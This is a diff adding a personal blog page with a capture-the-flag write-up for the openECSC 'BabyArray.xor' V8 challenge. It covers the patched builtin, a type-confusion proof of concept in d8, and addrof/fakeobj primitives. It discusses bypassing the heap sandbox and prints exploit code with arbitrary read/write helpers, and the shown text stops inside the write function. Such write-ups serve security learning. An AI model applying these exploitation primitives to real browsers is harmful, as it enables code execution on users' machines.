@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8">
+    <title>Matus Mandzak</title>
+    <link rel="stylesheet" href="/assets/css/main.css">
+    <link rel="stylesheet" href="/assets/css/blog.css">
+  </head>
+  <body>
+    <div class="centered"><header class="flex justify-between align-center centered mb-3"><h1 class="no-margin flex text-xxl font-bold text-black">
+      <a href="/" class="red">Matus Mandzak <span class="yellow font-light">- openECSC - BabyArray.xor</span></a>
+    </h1>
+    <nav class="flex yellow">
+      <a class="page-link transition-colors hover:text-red text-l" href="/assets/CV.pdf">CV</a><div class="mr-2 ml-2">|</div>
+            <a class="page-link transition-colors hover:text-red text-l" href="/posts.html">blog</a></nav>
+</header><p class="centered font-light no-margin text-xl grey3  mb-12">   </p>
+    <div class="centered"><p><em>Challenge to get familiar with V8 internals</em></p>
+
+<p>Even though I do not have much experience with V8 challenges and pwn up until this point, I spent last week learning about v8 exploits and I wanted to try to tackle this challenge from openECSC. For the info I did not manage to solve it by myself at first, because I was struggling to get my wasm code to work properly, so I had to look up how others bypassed the problems I encountered, which I will explain later.</p>
+
+<p>From what I currently know, v8 exploits are usually multistage. The first thing needed to achieve is some kind of memory corruption/type confusion, after that the most common approach is to get addrof and fakeobj primitives, which are somehow equivalent to “arbitrary” read and creating fake objects at arbitrary places. These two are further utilized to get “arbitrary” reads and writes and eventually code execution. (Note “” around arbitrary, on recent V8 versions there is mitigation in place which prevent arbitrary reads, but we will get into that)</p>
+
+<h2 id="new-functionality">New functionality?</h2>
+<p>The challenge introduces new method which can be applied on Array objects.</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">+</span><span class="cm">/*
++  Array.xor()
++
++  let x = [0.1, 0.2, 0.3];
++  x.xor(5);
++*/</span>
+<span class="o">+</span><span class="nc">BUILTIN</span><span class="p">(</span><span class="nx">ArrayXor</span><span class="p">)</span> <span class="p">{</span>
+<span class="o">+</span>  <span class="nx">HandleScope</span> <span class="nf">scope</span><span class="p">(</span><span class="nx">isolate</span><span class="p">);</span>
+<span class="o">+</span>  <span class="nx">Factory</span> <span class="o">*</span><span class="nx">factory</span> <span class="o">=</span> <span class="nx">isolate</span><span class="o">-&gt;</span><span class="nf">factory</span><span class="p">();</span>
+<span class="o">+</span>  <span class="nx">Handle</span><span class="o">&lt;</span><span class="nb">Object</span><span class="o">&gt;</span> <span class="nx">receiver</span> <span class="o">=</span> <span class="nx">args</span><span class="p">.</span><span class="nf">receiver</span><span class="p">();</span>
+<span class="o">+</span>
+<span class="o">+</span>  <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nc">IsJSArray</span><span class="p">(</span><span class="o">*</span><span class="nx">receiver</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nc">HasOnlySimpleReceiverElements</span><span class="p">(</span><span class="nx">isolate</span><span class="p">,</span> <span class="nx">JSArray</span><span class="p">::</span><span class="nf">cast</span><span class="p">(</span><span class="o">*</span><span class="nx">receiver</span><span class="p">)))</span> <span class="p">{</span>
+<span class="o">+</span>    <span class="nc">THROW_NEW_ERROR_RETURN_FAILURE</span><span class="p">(</span><span class="nx">isolate</span><span class="p">,</span> <span class="nc">NewTypeError</span><span class="p">(</span><span class="nx">MessageTemplate</span><span class="p">::</span><span class="nx">kPlaceholderOnly</span><span class="p">,</span>
+<span class="o">+</span>      <span class="nx">factory</span><span class="o">-&gt;</span><span class="nc">NewStringFromAsciiChecked</span><span class="p">(</span><span class="dl">"</span><span class="s2">Nope</span><span class="dl">"</span><span class="p">)));</span>
+<span class="o">+</span>  <span class="p">}</span>
+<span class="o">+</span>
+<span class="o">+</span>  <span class="nx">Handle</span><span class="o">&lt;</span><span class="nx">JSArray</span><span class="o">&gt;</span> <span class="nx">array</span> <span class="o">=</span> <span class="nx">Handle</span><span class="o">&lt;</span><span class="nx">JSArray</span><span class="o">&gt;</span><span class="p">::</span><span class="nf">cast</span><span class="p">(</span><span class="nx">receiver</span><span class="p">);</span>
+<span class="o">+</span>  <span class="nx">ElementsKind</span> <span class="nx">kind</span> <span class="o">=</span> <span class="nx">array</span><span class="o">-&gt;</span><span class="nc">GetElementsKind</span><span class="p">();</span>
+<span class="o">+</span>
+<span class="o">+</span>  <span class="k">if </span><span class="p">(</span><span class="nx">kind</span> <span class="o">!=</span> <span class="nx">PACKED_DOUBLE_ELEMENTS</span><span class="p">)</span> <span class="p">{</span>
+<span class="o">+</span>    <span class="nc">THROW_NEW_ERROR_RETURN_FAILURE</span><span class="p">(</span><span class="nx">isolate</span><span class="p">,</span> <span class="nc">NewTypeError</span><span class="p">(</span><span class="nx">MessageTemplate</span><span class="p">::</span><span class="nx">kPlaceholderOnly</span><span class="p">,</span>
+<span class="o">+</span>      <span class="nx">factory</span><span class="o">-&gt;</span><span class="nc">NewStringFromAsciiChecked</span><span class="p">(</span><span class="dl">"</span><span class="s2">Array.xor needs array of double numbers</span><span class="dl">"</span><span class="p">)));</span>
+<span class="o">+</span>  <span class="p">}</span>
+<span class="o">+</span>
+<span class="o">+</span>  <span class="c1">// Array.xor() needs exactly 1 argument</span>
+<span class="o">+</span>  <span class="k">if </span><span class="p">(</span><span class="nx">args</span><span class="p">.</span><span class="nf">length</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+<span class="o">+</span>    <span class="nc">THROW_NEW_ERROR_RETURN_FAILURE</span><span class="p">(</span><span class="nx">isolate</span><span class="p">,</span> <span class="nc">NewTypeError</span><span class="p">(</span><span class="nx">MessageTemplate</span><span class="p">::</span><span class="nx">kPlaceholderOnly</span><span class="p">,</span>
+<span class="o">+</span>      <span class="nx">factory</span><span class="o">-&gt;</span><span class="nc">NewStringFromAsciiChecked</span><span class="p">(</span><span class="dl">"</span><span class="s2">Array.xor needs exactly one argument</span><span class="dl">"</span><span class="p">)));</span>
+<span class="o">+</span>  <span class="p">}</span>
+<span class="o">+</span>
+<span class="o">+</span>  <span class="c1">// Get array len</span>
+<span class="o">+</span>  <span class="nx">uint32_t</span> <span class="nx">length</span> <span class="o">=</span> <span class="nx">static_cast</span><span class="o">&lt;</span><span class="nx">uint32_t</span><span class="o">&gt;</span><span class="p">(</span><span class="nb">Object</span><span class="p">::</span><span class="nc">Number</span><span class="p">(</span><span class="nx">array</span><span class="o">-&gt;</span><span class="nf">length</span><span class="p">()));</span>
+<span class="o">+</span>
+<span class="o">+</span>  <span class="c1">// Get xor value</span>
+<span class="o">+</span>  <span class="nx">Handle</span><span class="o">&lt;</span><span class="nb">Object</span><span class="o">&gt;</span> <span class="nx">xor_val_obj</span><span class="p">;</span>
+<span class="o">+</span>  <span class="nc">ASSIGN_RETURN_FAILURE_ON_EXCEPTION</span><span class="p">(</span><span class="nx">isolate</span><span class="p">,</span> <span class="nx">xor_val_obj</span><span class="p">,</span> <span class="nb">Object</span><span class="p">::</span><span class="nc">ToNumber</span><span class="p">(</span><span class="nx">isolate</span><span class="p">,</span> <span class="nx">args</span><span class="p">.</span><span class="nf">at</span><span class="p">(</span><span class="mi">1</span><span class="p">)));</span>
+<span class="o">+</span>  <span class="nx">uint64_t</span> <span class="nx">xor_val</span> <span class="o">=</span> <span class="nx">static_cast</span><span class="o">&lt;</span><span class="nx">uint64_t</span><span class="o">&gt;</span><span class="p">(</span><span class="nb">Object</span><span class="p">::</span><span class="nc">Number</span><span class="p">(</span><span class="o">*</span><span class="nx">xor_val_obj</span><span class="p">));</span>
+<span class="o">+</span>
+<span class="o">+</span>  <span class="c1">// Ah yes, xoring doubles..</span>
+<span class="o">+</span>  <span class="nx">Handle</span><span class="o">&lt;</span><span class="nx">FixedDoubleArray</span><span class="o">&gt;</span> <span class="nf">elements</span><span class="p">(</span><span class="nx">FixedDoubleArray</span><span class="p">::</span><span class="nf">cast</span><span class="p">(</span><span class="nx">array</span><span class="o">-&gt;</span><span class="nf">elements</span><span class="p">()),</span> <span class="nx">isolate</span><span class="p">);</span>
+<span class="o">+</span>  <span class="nc">FOR_WITH_HANDLE_SCOPE</span><span class="p">(</span><span class="nx">isolate</span><span class="p">,</span> <span class="nx">uint32_t</span><span class="p">,</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">i</span><span class="p">,</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">length</span><span class="p">,</span> <span class="nx">i</span><span class="o">++</span><span class="p">,</span> <span class="p">{</span>
+<span class="o">+</span>    <span class="nx">double</span> <span class="nx">x</span> <span class="o">=</span> <span class="nx">elements</span><span class="o">-&gt;</span><span class="nf">get_scalar</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
+<span class="o">+</span>    <span class="nx">uint64_t</span> <span class="nx">result</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="nx">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">x</span><span class="p">)</span> <span class="o">^</span> <span class="nx">xor_val</span><span class="p">;</span>
+<span class="o">+</span>    <span class="nx">elements</span><span class="o">-&gt;</span><span class="nf">set</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="nx">double</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">result</span><span class="p">);</span>
+<span class="o">+</span>  <span class="p">});</span>
+<span class="o">+</span>  
+<span class="o">+</span>  <span class="k">return</span> <span class="nc">ReadOnlyRoots</span><span class="p">(</span><span class="nx">isolate</span><span class="p">).</span><span class="nf">undefined_value</span><span class="p">();</span>
+<span class="o">+</span><span class="p">}</span>
+<span class="o">+</span>
+</code></pre></div></div>
+<p>This patch introduces new .xor() prototype, that can be used to xor all values in array of doubles.</p>
+
+<p>Looking at the patch we can see it makes sure that all elements of the array are <code class="language-plaintext highlighter-rouge">PACKED_DOUBLE_ELEMENTS</code>, as well as the check whether the array is indeed an array and <code class="language-plaintext highlighter-rouge">HASONLYSIMPLERECEIVERELEMENTS</code>, which according to chromium source code “Checks that we have no accessors on the receiver’s elements. “.</p>
+
+<p>Overall the new functionality seems to be vulnerability proof or is it?
+If we take a look it does not check anything regarding the argument which gets passed into the function. All it does is to cast it to ToNumber and this happens after all checks regarding our array.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>d8&gt; arr = [1.1, 1.2, 1.3]
+[1.1, 1.2, 1.3]
+d8&gt; bad = {valueOf: () =&gt; {arr[0] = {}; return 1;}}
+{valueOf: () =&gt; {arr[0] = {}; return 1;}}
+d8&gt; arr.xor(bad)
+undefined
+d8&gt; arr
+[141920, 1.2, 141944]
+</code></pre></div></div>
+
+<p>Woah v8 returned integer value rather than float, what happened?
+Using <code class="language-plaintext highlighter-rouge">./d8 --allow-natives-syntax</code> we can use debug statements to get more information about what happened.</p>
+
+<p>Let’s try to use debug print on original array.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>d8&gt; arr = [1.1, 1.2, 1.3]
+[1.1, 1.2, 1.3]
+d8&gt; %DebugPrint(arr)
+DebugPrint: 0xf3e00042be9: [JSArray]
+ - map: 0x0f3e001cb7c5 &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x0f3e001cb11d &lt;JSArray[0]&gt;
+ - elements: 0x0f3e00042bc9 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]
+ - length: 3
+ - properties: 0x0f3e00000725 &lt;FixedArray[0]&gt;
+ - All own properties (excluding elements): {
+    0xf3e00000d99: [String] in ReadOnlySpace: #length: 0x0f3e00025f85 &lt;AccessorInfo name= 0x0f3e00000d99 &lt;String[6]: #length&gt;, data= 0x0f3e00000069 &lt;undefined&gt;&gt; (const accessor descriptor, attrs: [W__]), location: descriptor
+ }
+ - elements: 0x0f3e00042bc9 &lt;FixedDoubleArray[3]&gt; {
+           0: 1.1
+           1: 1.2
+           2: 1.3
+ }
+0xf3e001cb7c5: [Map] in OldSpace
+ - map: 0x0f3e001c01b5 &lt;MetaMap (0x0f3e001c0205 &lt;NativeContext[295]&gt;)&gt;
+ - type: JS_ARRAY_TYPE
+ - instance size: 16
+ - inobject properties: 0
+ - unused property fields: 0
+ - elements kind: PACKED_DOUBLE_ELEMENTS
+ - enum length: invalid
+ - back pointer: 0x0f3e001cb785 &lt;Map[16](HOLEY_SMI_ELEMENTS)&gt;
+ - prototype_validity cell: 0x0f3e00000a89 &lt;Cell value= 1&gt;
+ - instance descriptors #1: 0x0f3e001cb751 &lt;DescriptorArray[1]&gt;
+ - transitions #1: 0x0f3e001cb7ed &lt;TransitionArray[4]&gt;
+   Transition array #1:
+     0x0f3e00000e5d &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x0f3e001cb805 &lt;Map[16](HOLEY_DOUBLE_ELEMENTS)&gt;
+ - prototype: 0x0f3e001cb11d &lt;JSArray[0]&gt;
+ - constructor: 0x0f3e001cae09 &lt;JSFunction Array (sfi = 0xf3e0002b2f9)&gt;
+ - dependent code: 0x0f3e00000735 &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;
+ - construction counter: 0
+
+[1.1, 1.2, 1.3]
+</code></pre></div></div>
+<p>I am not going to explain the whole output, important thing to notice is the type of array = <code class="language-plaintext highlighter-rouge">PACKED_DOUBLE_ELEMENTS</code>. This map object helps v8 to differentiante between different types of arrays in memory.</p>
+
+<p>Let’s try to corrupt memory and see what happens.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>d8&gt; bad = {valueOf: () =&gt; {arr[0] = {}; return 1;}}
+{valueOf: () =&gt; {arr[0] = {}; return 1;}}
+d8&gt; arr.xor(bad)
+undefined
+d8&gt; %DebugPrint(arr)
+DebugPrint: 0xf3e00042be9: [JSArray]
+ - map: 0x0f3e001cb845 &lt;Map[16](PACKED_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x0f3e001cb11d &lt;JSArray[0]&gt;
+ - elements: 0x0f3e00044e21 &lt;FixedArray[3]&gt; [PACKED_ELEMENTS]
+ - length: 3
+ - properties: 0x0f3e00000725 &lt;FixedArray[0]&gt;
+ - All own properties (excluding elements): {
+    0xf3e00000d99: [String] in ReadOnlySpace: #length: 0x0f3e00025f85 &lt;AccessorInfo name= 0x0f3e00000d99 &lt;String[6]: #length&gt;, data= 0x0f3e00000069 &lt;undefined&gt;&gt; (const accessor descriptor, attrs: [W__]), location: descriptor
+ }
+ - elements: 0x0f3e00044e21 &lt;FixedArray[3]&gt; {
+           0: 141058
+           1: 0x0f3e00044e41 &lt;HeapNumber 1.2&gt;
+           2: 141082
+ }
+
+ ...
+</code></pre></div></div>
+
+<p>Here we are getting <code class="language-plaintext highlighter-rouge">PACKED_ELEMENTS</code> instead of <code class="language-plaintext highlighter-rouge">PACKED_DOUBLE_ELEMENTS</code>. This is an indicator that we managed to corrupt the array to not be array of doubles. Important thing to note here is what is currently at arr[0]. If we take a look at our “bad” code we can see we set it to an object, meaning v8 firstly changed to array type to <code class="language-plaintext highlighter-rouge">PACKED_ELEMENTS</code> to be able to store different types rather than just double. After that xor functionality ran so it xorred the value with 1.</p>
+
+<h2 id="getting-addrof-and-fakeobj">Getting addrof and fakeobj</h2>
+<p>Given these properties, we can set arr[0] to point to some existing object to write a pointer in arr[0], which we can then read. This will provide us with <code class="language-plaintext highlighter-rouge">addrof</code> primitives, because we will be able to read ptr to any object.</p>
+
+<p>Other than that I gathered helper functions from other writeups to help with debugging and type casting:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">buffer</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">floatBuffer</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Float64Array</span><span class="p">(</span><span class="nx">buffer</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">int64Buffer</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BigUint64Array</span><span class="p">(</span><span class="nx">buffer</span><span class="p">);</span>
+<span class="kd">function</span> <span class="nf">i2f</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span><span class="nx">int64Buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">i</span><span class="p">;</span> <span class="k">return</span> <span class="nx">floatBuffer</span><span class="p">[</span><span class="mi">0</span><span class="p">];};</span>
+<span class="kd">function</span> <span class="nf">f2i</span><span class="p">(</span><span class="nx">f</span><span class="p">)</span> <span class="p">{</span><span class="nx">floatBuffer</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">f</span><span class="p">;</span> <span class="k">return</span> <span class="nx">int64Buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">];};</span>
+<span class="kd">function</span> <span class="nf">hex32</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="dl">"</span><span class="s2">0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nf">padStart</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">0</span><span class="p">);};</span>
+<span class="kd">function</span> <span class="nf">hex64</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="dl">"</span><span class="s2">0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nf">padStart</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="mi">0</span><span class="p">);};</span>
+</code></pre></div></div>
+
+<p>Let’s craft the addrof primitive:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">addrof</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">arr</span> <span class="o">=</span> <span class="p">[</span><span class="mf">13.37</span><span class="p">];</span> 
+    <span class="nx">arr</span><span class="p">.</span><span class="nf">xor</span><span class="p">({</span>
+        <span class="na">valueOf</span><span class="p">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+            <span class="nx">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span> 
+            <span class="nx">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">;</span> 
+            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">});</span>
+    <span class="k">return </span><span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">|</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>If you don’t have any experience with v8 you may be asking why am I shifting value by one bit and adding 1 to the end. This is because of tagged pointers. In PACKED_ELEMENTS array everything ending ending with LSB set gets interpreted as a pointer. To make sure this works properly all other values like SMI (small integers) needs to be shifted by 1 even though they may be ending with 0. When reading value, this will get automatically reversed so to get correct ptr as it is written on the v8 heap we need to do this.</p>
+
+<p>If you are trying to go through my writeup till this point you are definitely wondering why are we still getting only 32 bit addresses and not 64bits? Of course there is nothing at <code class="language-plaintext highlighter-rouge">0x00000000xxxxxxx1</code>. This is what V8 calls POINTER COMPRESSION. Given that v8 assumes everything is happening inside of v8’s heap (except JITted code where it gets really complicated) it does not need to store the first 4 bytes of the address - it is useless to store, because it is the same everytime. Therefore address like 0x00002f2741414141 gets compressed to 0x41414141 while being stored on heap.</p>
+
+<p>Having a valid ptr now we will be able to utilize fakeobj primitive which we can craft aswell.</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">fakeobj</span><span class="p">(</span><span class="nx">ptr</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">arr</span> <span class="o">=</span> <span class="p">[</span><span class="mf">13.37</span><span class="p">];</span> 
+    <span class="nx">arr</span><span class="p">.</span><span class="nf">xor</span><span class="p">({</span>
+        <span class="na">valueOf</span><span class="p">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+            <span class="nx">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span> 
+            <span class="nx">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nx">ptr</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1</span><span class="p">);</span> 
+            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">});</span>
+    <span class="k">return</span> <span class="nx">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="arbitrary-rw-not-so-fast">Arbitrary r/w? Not so fast!</h2>
+<p>Exploiting using addrof and fakeobj used to be pretty straightforward. From these two you could achieve arbitrary reads/writes pretty easily. After getting arb r/w primitives v8 exploitation went as follows:</p>
+<ol>
+  <li>try to allocate rwx page</li>
+  <li>write shellcode to rwx page</li>
+  <li>jump to shellcode</li>
+</ol>
+
+<p>However over the course of multiple years exploitation got harder with more mitigations in place. For example, at first you could allocate rwx just by JIT compiling a function. This was later mitigated by alternating permissions on allocated page between rw- and r-x. 
+Smarter people later discovered that you can compile wasm compiled code page to create rwx pages. 
+After that came another mitigation - V8 Heap Sandbox, which basically made sure that all external pointers are converted to indexes of a lookup table. <a href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8">Here</a> is the detail of the sandbox.</p>
+
+<p>To break this mitigation we can use JIT internal logic that writes floats to rwx page during compilation. Therefore we can write shellcode to rwx pages using simple function with double and then jump to it. There is an slight problem, because compiled doubles are not contigous, however this can still be bypassed by using relative jmps at the end of each block = “double”.</p>
+
+<p>Here is pretty good writeup explaining the topic: <a href="https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html">Breaking v8 heap sandbox</a></p>
+
+<p>Note: After looking at writeups from others, they were using old technique without heap sandbox just by creating wasm page and writing to it. However I wasn’t able to replicate their exploit using their code. What could have happened is that the docker image changed or ran on different CPU that had some mitigation enable.</p>
+
+<h2 id="voilà">Voilà</h2>
+<p>After few hours of trying to bypass the sandbox I got a flag and I was so happy and tired.
+Here is my full code:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">buffer</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">floatBuffer</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Float64Array</span><span class="p">(</span><span class="nx">buffer</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">int64Buffer</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BigUint64Array</span><span class="p">(</span><span class="nx">buffer</span><span class="p">);</span>
+
+<span class="kd">function</span> <span class="nf">i2f</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">int64Buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">i</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nx">floatBuffer</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="p">};</span>
+
+<span class="kd">function</span> <span class="nf">f2i</span><span class="p">(</span><span class="nx">f</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">floatBuffer</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">f</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nx">int64Buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="p">};</span>
+
+<span class="kd">function</span> <span class="nf">hex32</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="dl">"</span><span class="s2">0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nf">padStart</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="p">};</span>
+
+<span class="kd">function</span> <span class="nf">hex64</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="dl">"</span><span class="s2">0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nf">padStart</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="p">};</span>
+
+<span class="kd">function</span> <span class="nf">obj2ptr</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">arr</span> <span class="o">=</span> <span class="p">[</span><span class="mf">13.37</span><span class="p">];</span>
+    <span class="nx">arr</span><span class="p">.</span><span class="nf">xor</span><span class="p">({</span>
+        <span class="na">valueOf</span><span class="p">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+            <span class="nx">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>
+            <span class="nx">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">;</span>
+            <span class="k">return</span> <span class="mi">1</span>
+        <span class="p">}</span>
+    <span class="p">});</span>
+    <span class="k">return </span><span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">|</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="kd">function</span> <span class="nf">ptr2obj</span><span class="p">(</span><span class="nx">ptr</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">arr</span> <span class="o">=</span> <span class="p">[</span><span class="mf">13.37</span><span class="p">];</span>
+    <span class="nx">arr</span><span class="p">.</span><span class="nf">xor</span><span class="p">({</span>
+        <span class="na">valueOf</span><span class="p">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+            <span class="nx">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>
+            <span class="nx">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nx">ptr</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1</span><span class="p">);</span>
+            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">});</span>
+    <span class="k">return</span> <span class="nx">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nf">read</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">readArr</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">];</span>
+    <span class="nx">readArr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nf">i2f</span><span class="p">(</span><span class="mh">0x00000725001cb7c5</span><span class="nx">n</span><span class="p">);</span>
+    <span class="nx">readArr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nf">i2f</span><span class="p">(</span><span class="mh">0x0000000200000000</span><span class="nx">n</span> <span class="o">+</span> <span class="nc">BigInt</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x8</span><span class="nx">n</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nf">f2i</span><span class="p">(</span><span class="nf">ptr2obj</span><span class="p">(</span><span class="nf">obj2ptr</span><span class="p">(</span><span class="nx">readArr</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)[</span><span class="mi">0</span><span class="p">]);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nf">write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">writeArr</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">];</span>
+    <span class="nx">writeArr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nf">i2f</span><span class="p">(</span><span class="mh">0x00000725001cb7c5</span><span class="nx">n</span><span class="p">);</span>
